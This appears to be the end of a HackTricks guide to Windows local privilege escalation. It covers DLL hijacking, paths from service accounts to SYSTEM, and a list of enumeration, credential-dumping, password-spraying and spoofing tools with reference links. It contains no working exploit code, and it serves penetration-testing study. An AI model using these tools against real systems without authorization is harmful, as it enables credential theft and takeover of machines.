If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
